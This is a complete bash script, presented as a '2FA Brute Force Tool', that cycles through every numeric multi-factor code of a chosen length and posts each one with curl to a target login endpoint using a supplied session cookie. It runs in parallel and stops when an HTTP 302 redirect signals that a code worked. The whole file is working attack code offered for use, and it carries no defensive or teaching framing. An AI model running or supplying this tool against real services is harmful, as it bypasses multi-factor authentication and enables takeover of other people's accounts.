#!/bin/bash

# ===== DEFAULTS =====
LENGTH=4
THREADS=1
VERBOSE=0

# ===== COLORS =====
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ===== HELP =====
show_help() {
echo "=================================================="
echo "        2FA Brute Force Tool"
echo "=================================================="
echo ""
echo "Description:"
echo "  Brute forces numeric 2FA/MFA codes."
echo "  Stops automatically when HTTP 302 is detected."
echo ""
echo "Usage:"
echo "  $0 -u <url> -c <cookie> [options]"
echo ""
echo "Required:"
echo "  -u <url>        Target endpoint"
echo "  -c <cookie>     Session + verify cookie"
echo ""
echo "Options:"
echo "  -l <length>     MFA length (default: 4)"
echo "  -t <threads>    Threads (default: 1 - safe)"
echo "  -v              Verbose mode"
echo "  -h              Show this help"
echo ""
echo "Examples:"
echo "  $0 -u https://target/login2 \\"
echo "     -c \"session=abc; verify=user\""
echo ""
echo "  $0 -u https://target/login2 \\"
echo "     -c \"session=abc; verify=user\" \\"
echo "     -l 6 -t 5 -v"
echo ""
echo "Notes:"
echo "  - High threads may cause timeouts"
echo "  - Use fresh session for each attempt"
echo ""
echo "=================================================="
exit 0
}

# ===== ARG PARSE =====
while getopts "u:c:l:t:hv" opt; do
  case $opt in
    u) URL="$OPTARG" ;;
    c) COOKIE="$OPTARG" ;;
    l) LENGTH="$OPTARG" ;;
    t) THREADS="$OPTARG" ;;
    v) VERBOSE=1 ;;
    h) show_help ;;
    *) show_help ;;
  esac
done

# ===== CHECK =====
if [ -z "$URL" ] || [ -z "$COOKIE" ]; then
    show_help
fi

# ===== VALIDATION =====
if ! [[ "$LENGTH" =~ ^[0-9]+$ ]]; then
    echo -e "${RED}[-] Invalid length!${NC}"
    exit 1
fi

# ===== RANGE =====
MAX=$(printf "%0${LENGTH}d" $((10**LENGTH - 1)))
TOTAL=$((10**LENGTH))

echo -e "${YELLOW}[*] Target:${NC} $URL"
echo -e "${YELLOW}[*] Length:${NC} $LENGTH digits"
echo -e "${YELLOW}[*] Threads:${NC} $THREADS"
echo -e "${YELLOW}[*] Total Attempts:${NC} $TOTAL"
echo -e "${YELLOW}[*] Starting...${NC}"

FOUND_FILE="/tmp/2fa_found"
rm -f "$FOUND_FILE"

export URL COOKIE VERBOSE FOUND_FILE

# ===== MAIN =====
seq -w 0 "$MAX" | xargs -I {} -P "$THREADS" bash -c '
[ -f "$FOUND_FILE" ] && exit 0

MFA="mfa-code={}"

CODE=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" \
-b "$COOKIE" \
--data-binary "$MFA" \
"$URL")

if [ "$CODE" = "302" ]; then
    echo -e "\n\033[0;32m✅ FOUND: $MFA\033[0m"
    echo "$MFA" > "$FOUND_FILE"
fi

if [ "$VERBOSE" -eq 1 ]; then
    echo "[*] Trying: $MFA"
fi
'

# ===== FINAL CHECK =====
if [ -f "$FOUND_FILE" ]; then
    echo -e "${GREEN}[+] Attack completed successfully${NC}"
else
    echo -e "\n${RED}[-] Not found or session expired${NC}"
fi
